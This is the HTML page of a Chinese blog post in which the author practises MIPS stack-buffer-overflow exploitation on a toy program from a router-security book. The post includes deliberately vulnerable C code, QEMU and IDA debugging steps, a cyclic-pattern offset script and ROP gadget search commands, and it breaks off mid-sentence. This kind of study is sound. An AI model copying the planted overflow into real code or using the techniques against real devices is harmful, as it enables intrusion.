@@ -1,0 +1,361 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>路由器漏洞挖掘初探 | EPs1l0h's Castle</title><meta name="author" content="EPs1l0h"><meta name="copyright" content="EPs1l0h"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="最近刚入门IOT安全，孩子一脸懵，学长推荐了一本书 《揭秘家用路由器0day漏洞挖掘技术》，慢慢啃一会儿先。 一些前置芝士各种环境，书中主要介绍了MIPS架构，基于QEMU开发运行环境，然后用buildroot搭建编译环境，这里先用轻量级的 mips-linux-gnu-gcc 搭建编译环境，用 qemu-mips-static 搭建用户级的运行环境，先凑合用吧。 各种工具：binwalk，ida">
+<meta property="og:type" content="article">
+<meta property="og:title" content="路由器漏洞挖掘初探">
+<meta property="og:url" content="https://example.com/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/index.html">
+<meta property="og:site_name" content="EPs1l0h&#39;s Castle">
+<meta property="og:description" content="最近刚入门IOT安全，孩子一脸懵，学长推荐了一本书 《揭秘家用路由器0day漏洞挖掘技术》，慢慢啃一会儿先。 一些前置芝士各种环境，书中主要介绍了MIPS架构，基于QEMU开发运行环境，然后用buildroot搭建编译环境，这里先用轻量级的 mips-linux-gnu-gcc 搭建编译环境，用 qemu-mips-static 搭建用户级的运行环境，先凑合用吧。 各种工具：binwalk，ida">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://github.com/EPs1l0h/EPs1l0h.github.io/blob/main/medias/cover/cover1.jpg?raw=true">
+<meta property="article:published_time" content="2024-04-18T08:59:23.000Z">
+<meta property="article:modified_time" content="2024-04-24T17:37:09.753Z">
+<meta property="article:author" content="EPs1l0h">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/EPs1l0h/EPs1l0h.github.io/blob/main/medias/cover/cover1.jpg?raw=true"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://example.com/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '路由器漏洞挖掘初探',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-04-25 01:37:09'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">46</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://github.com/EPs1l0h/EPs1l0h.github.io/blob/main/medias/cover/cover1.jpg?raw=true')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">EPs1l0h's Castle</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">路由器漏洞挖掘初探</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-04-18T08:59:23.000Z" title="发表于 2024-04-18 16:59:23">2024-04-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-04-24T17:37:09.753Z" title="更新于 2024-04-25 01:37:09">2024-04-25</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="路由器漏洞挖掘初探"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>最近刚入门IOT安全，孩子一脸懵，学长推荐了一本书 《揭秘家用路由器0day漏洞挖掘技术》，慢慢啃一会儿先。</p>
+<h1 id="一些前置芝士"><a href="#一些前置芝士" class="headerlink" title="一些前置芝士"></a>一些前置芝士</h1><p>各种环境，书中主要介绍了MIPS架构，基于QEMU开发运行环境，然后用buildroot搭建编译环境，这里先用轻量级的 <code>mips-linux-gnu-gcc</code> 搭建编译环境，用 <code>qemu-mips-static</code> 搭建用户级的运行环境，先凑合用吧。</p>
+<p>各种工具：binwalk，idapro及相关插件，qemu，MIPS交叉编译环境等</p>
+<p>还有就是 MIPS 堆栈原理，比较重要的有：</p>
+<ol>
+<li>栈操作：MIPS32 架构堆栈与x86架构一样，都是向低地址增长的。但在MIPS32 架构中没有EBP(栈底指针)，进入一个函数时，需要将当前指针向下移动 n 比特，这个大小为 n 比特的存储空间就是此函数的 Stack Frame 的存储区域。此后，栈指针便不再移动，只能在函数返回时将栈指针加上这个偏移量恢复栈现场。由于不能随便移动栈指针，所以寄存器压栈和出栈时都必须指定偏移量。</li>
+<li>调用:如果函数A调用函数B，调用者函数(数A)会在自己的栈顶预留一部分空间来保存被调用者(函数B)的参数，我们称之为调用参数空间。</li>
+<li>参数传递方式:前4个传入的参数通过<code>Sa0~Sa3</code>传递。有些函数的参数可能会超过4个此时，多余的参数会被放入调用参数空间。x86架构下的所有参数都是通过堆传递的。</li>
+<li>返回地址:在x86架构中，使用<code>cal</code>命令调用函数时，会先将当前执行位置压入堆栈，MIPS的调用指令把函数的返回地址直接存入SRA寄存器而不是堆中。</li>
+</ol>
+<h1 id="一次-MIPS-缓冲区溢出利用实践"><a href="#一次-MIPS-缓冲区溢出利用实践" class="headerlink" title="一次 MIPS 缓冲区溢出利用实践"></a>一次 MIPS 缓冲区溢出利用实践</h1><h2 id="Crash"><a href="#Crash" class="headerlink" title="Crash"></a>Crash</h2><p>源码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">do_system</span><span class="params">(<span class="type">int</span> code, <span class="type">char</span> *cmd)</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">255</span>];</span><br><span class="line">    system(cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">char</span> ch;</span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> fileLen = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">fileData</span>;</span></span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">0</span> ==stat(<span class="string">&quot;passwd&quot;</span>, &amp;fileData))</span><br><span class="line">        fileLen = fileData.st_size;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>((fp = fopen(<span class="string">&quot;passwd&quot;</span>, <span class="string">&quot;rb&quot;</span>)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Cannot open file passwd!\n&quot;</span>);   </span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ch = fgetc(fp);</span><br><span class="line">    <span class="keyword">while</span>(count &lt;= fileLen) &#123;</span><br><span class="line">        buf[count++] = ch;</span><br><span class="line">        ch = fgetc(fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    buf[--count] = <span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(buf, <span class="string">&quot;adminpwd&quot;</span>)) &#123;</span><br><span class="line">        do_system(count, <span class="string">&quot;ls -l&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;you have an invalid password!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>使用如下命令编译（新版的 mips-gcc 加入了一些防止栈溢出的机制比如 stack guard，我们可以用 <code>-fno-stack-protector</code> 参数取消该保护机制），然后在需要的 <code>passwd</code> 文件中写入一堆 A 字符，运行</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mips-linux-gnu-gcc -fno-stack-protector vuln_system.c -o vuln_system -static</span><br><span class="line">python3 -c <span class="string">&quot;print(&#x27;A&#x27; * 600)&quot;</span> &gt; passwd</span><br><span class="line">qemu-mips-static vuln_system</span><br></pre></td></tr></table></figure>
+<p>可以看到程序在验证完密码是否正确以后崩溃</p>
+<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/Blog\source\_posts\路由器漏洞挖掘初探\image-20240418170941376.png" alt="image-20240418170941376"></p>
+<p>我们使用IDA对程序进行调试，方法如下：</p>
+<p>使用如下命令启动待调试的目标程序：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;print(&#x27;A&#x27;*0x19C)&quot;</span> &gt; passwd</span><br><span class="line">qemu-mips-static -g 1234 vuln_system</span><br></pre></td></tr></table></figure>
+<p>然后调整 IDA 的 remote GDB debugger 参数</p>
+<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/Blog\source\_posts\路由器漏洞挖掘初探\image-20240418171616208.png" alt="image-20240418171616208"></p>
+<p>在文件读入循环之前下断点：</p>
+<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/Blog\source\_posts\路由器漏洞挖掘初探\image-20240418173644974.png" alt="image-20240418173644974"></p>
+<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/Blog\source\_posts\路由器漏洞挖掘初探\image-20240418173614592.png" alt="image-20240418173614592"></p>
+<p>可以看到此时的 <code>saved_ra</code> 局部变量为 <code>0x400AA0</code></p>
+<p>把整个循环运行完毕，再次查看该局部变量，发现已被覆盖</p>
+<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/Blog\source\_posts\路由器漏洞挖掘初探\image-20240418174008210.png" alt="image-20240418174008210"></p>
+<p>不过好像因为目前版本的 <code>mips-linux-gnu-gcc</code> 加入了 <code>stack_guard</code>，这个在执行到 <code>saved_ra</code> 赋值给 <code>RA</code> 寄存器以前进程就被结束了，所以没法继续模拟了。</p>
+<h2 id="栈溢出覆盖saved-ra局部变量进而覆盖RA寄存器"><a href="#栈溢出覆盖saved-ra局部变量进而覆盖RA寄存器" class="headerlink" title="栈溢出覆盖saved_ra局部变量进而覆盖RA寄存器"></a>栈溢出覆盖saved_ra局部变量进而覆盖RA寄存器</h2><p>通过静态分析，我们可以知道通过赋值循环，我们把 <code>passwd</code> 中的数据覆盖到了从 <code>*(fp + *(fp + 32)+ 188)</code> 的栈空间里，<code>*(fp + 32)</code> 是一个 <code>count</code> 下标计数器。</p>
+<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/Blog\source\_posts\路由器漏洞挖掘初探\image-20240418183826827.png" alt="image-20240418183826827"></p>
+<p>我们再来看最后的 <code>saved_ra</code> 局部变量所在的栈空间地址，发现是在 <code>*(sp + 452)</code> 这个位置，而此时 sp 和 fp 指向相同的地址，所以实际的偏移是 <code>452 - 188 = 264 = 0x108</code>，也就是说我们的 payload 可以是 <code>0x108 * &#39;A&#39; + addr</code>，就可以达到覆写 <code>RA</code> 寄存器的目的。</p>
+<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/Blog\source\_posts\路由器漏洞挖掘初探\image-20240418184042630.png" alt="image-20240418184042630"></p>
+<h2 id="漏洞利用开发过程"><a href="#漏洞利用开发过程" class="headerlink" title="漏洞利用开发过程"></a>漏洞利用开发过程</h2><h3 id="劫持PC"><a href="#劫持PC" class="headerlink" title="劫持PC"></a>劫持PC</h3><p>比如往 <code>passwd</code> 文件里面写 600 个A，造成缓冲区溢出，程序崩溃</p>
+<h3 id="确定偏移"><a href="#确定偏移" class="headerlink" title="确定偏移"></a>确定偏移</h3><p>方法一：字符脚本（类似于fuzz）</p>
+<p>建立大量字符，在这些字符中任取四位且这四位的值在集合中唯一，这样我们就可以找出覆盖到PC的4个字符在字符集中的偏移，当然得保证这四个字符都必须是不可执行的地址，下面放一个脚本示例：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">a = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">b = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">c = <span class="string">&quot;0123456789&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate</span>(<span class="params">count, outputFile</span>):</span><br><span class="line">    codeStr = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[*] Create pattern string contains <span class="subst">&#123;count&#125;</span> characters&#x27;</span>)</span><br><span class="line">    timeStart = time.time()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, count):</span><br><span class="line">        codeStr += a[i // (<span class="number">26</span> * <span class="number">10</span>)] + b[(i % (<span class="number">26</span> * <span class="number">10</span>)) // <span class="number">10</span>] + c[i % (<span class="number">26</span> * <span class="number">10</span>) % <span class="number">10</span>]</span><br><span class="line">    <span class="keyword">if</span> outputFile:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[+] output to <span class="subst">&#123;outputFile&#125;</span>&#x27;</span>)</span><br><span class="line">        fw = <span class="built_in">open</span>(outputFile, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        fw.write(codeStr)</span><br><span class="line">        fw.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[+] take time: <span class="subst">&#123;time.time() - timeStart : <span class="number">.4</span>f&#125;</span> s&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> codeStr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">patternMatch</span>(<span class="params">searchCode, length=<span class="number">1024</span></span>):</span><br><span class="line">   offset = <span class="number">0</span></span><br><span class="line">   pattern = <span class="literal">None</span></span><br><span class="line">       </span><br><span class="line">   timeStart = time.time()</span><br><span class="line">   is0xHex = re.match(<span class="string">&#x27;^0x[0-9a-fA-F]&#123;8&#125;&#x27;</span>,searchCode)</span><br><span class="line">   isHex = re.match(<span class="string">&#x27;^[0-9a-fA-F]&#123;8&#125;&#x27;</span>,searchCode)</span><br><span class="line">       </span><br><span class="line">   <span class="keyword">if</span> is0xHex:</span><br><span class="line">       pattern = binascii.a2b_hex(searchCode[<span class="number">2</span>:])</span><br><span class="line">   <span class="keyword">elif</span> isHex:</span><br><span class="line">       pattern = binascii.a2b_hex(searchCode)</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       <span class="built_in">print</span> (<span class="string">&#x27;[-] seach Pattern eg:0x41613141&#x27;</span>)</span><br><span class="line">       sys.exit(<span class="number">1</span>)</span><br><span class="line">       </span><br><span class="line">   source = generate(length,<span class="literal">None</span>)</span><br><span class="line">   offset = source.find(pattern)</span><br><span class="line">       </span><br><span class="line">   <span class="keyword">if</span> offset != -<span class="number">1</span>:</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">f&quot;[*] Exact match at offset <span class="subst">&#123;offset&#125;</span>&quot;</span>)</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">f&quot;[*] No exact matches, looking for likely candidates...&quot;</span>)</span><br><span class="line">       reverse = <span class="built_in">list</span>(pattern)</span><br><span class="line">       reverse.reverse()</span><br><span class="line">       pattern = <span class="string">&quot;&quot;</span>.join(reverse)</span><br><span class="line">       offset = source.find(pattern)</span><br><span class="line">       </span><br><span class="line">       <span class="keyword">if</span> offset != -<span class="number">1</span>:</span><br><span class="line">           <span class="built_in">print</span>(<span class="string">f&quot;[+] Possible match at offset <span class="subst">&#123;offset&#125;</span> (adjusted another-endian)&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">f&quot;[+] take time: <span class="subst">&#123;time.time() - timeStart : <span class="number">.4</span>f&#125;</span> s&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-s&#x27;</span>, <span class="string">&#x27;--search&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;search for pattern&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--create&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;create a pattern&#x27;</span>,action=<span class="string">&#x27;store_true&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-f&#x27;</span>,<span class="string">&#x27;--file&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;output file name&#x27;</span>,default=<span class="string">&#x27;patternShell.txt&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-l&#x27;</span>, <span class="string">&#x27;--length&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;length of pattern code&#x27;</span>,<span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">1024</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    length= args.length</span><br><span class="line">    output = args.file</span><br><span class="line">    createCode = args.create</span><br><span class="line">    searchCode = args.search</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> createCode <span class="keyword">and</span> (<span class="number">0</span> &lt;args.length &lt;= <span class="number">26</span>*<span class="number">26</span>*<span class="number">10</span>):</span><br><span class="line">        generate(length,output)</span><br><span class="line">    <span class="keyword">elif</span> searchCode <span class="keyword">and</span> (<span class="number">0</span> &lt;args.length &lt;=<span class="number">26</span>*<span class="number">26</span>*<span class="number">10</span>):</span><br><span class="line">        patternMatch(searchCode,length)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[-] You shoud chices from [-c -s]&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[-] Pattern length must be less than 6760&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;more help: pattern.py -h&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>方法二：栈帧分析</p>
+<p>可以通过动态&amp;静态结合的方式，找打buf在栈空间中的地址，再找到 <code>saved_ra</code> 的地址，最后计算偏移 <code>offset = saved_ra - buf_addr</code></p>
+<h3 id="确定攻击途径"><a href="#确定攻击途径" class="headerlink" title="确定攻击途径"></a>确定攻击途径</h3><p>方法一：命令执行</p>
+<p>之前的那个程序中有一个函数<code>do_system_0</code>，但是只能执行 <code>ls -l</code> 命令，我们可以构造一条 ROP Chain，通过溢出漏洞调用该函数并让其执行任意命令，</p>
+<p>可以使用<code>mipsrop</code> 插件搜索构造合适的 ROP Chain，使用命令如下</p>
+<p>由于该插件是 python2 写的，高版本ida可以直接用2to3工具转换以后使用</p>
+<p>在idapython窗口输入以下命令启动</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> mipsrop</span><br><span class="line">mipsrop = mipsrop.MIPSROPFinder()</span><br></pre></td></tr></table></figure>
+<p>然后在输出窗口的python 命令行里输入以下命令即可</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mipsrop.help()</span><br><span class="line">mipsrop.system()</span><br><span class="line">mipsrop.find(instruction_str)</span><br><span class="line">mipsrop.doubles()</span><br><span class="line">mipsrop.stackfinders() <span class="comment">#使用比较多</span></span><br><span class="line">mipsrop.tails()</span><br><span class="line">mipsrop.summary()</span><br></pre></td></tr></table></figure>
+<p><img src="/2024/04/18/%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%88%9D%E6%8E%A2/Blog\source\_posts\路由器漏洞挖掘初探\image-20240424150217897.png" alt="image-20240424150217897"></p>
+<p>方法二：构造 shellcode</p>
+<h3 id="构建漏洞攻击数据"><a href="#构建漏洞攻击数据" class="headerlink" title="构建漏洞攻击数据"></a>构建漏洞攻击数据</h3><p>通过之前的分析我们首先找出 <code>saved_ra - dest = 404</code>，然后我们开始找gadget，通过搜索 *dir 函数末尾找到一段</p>
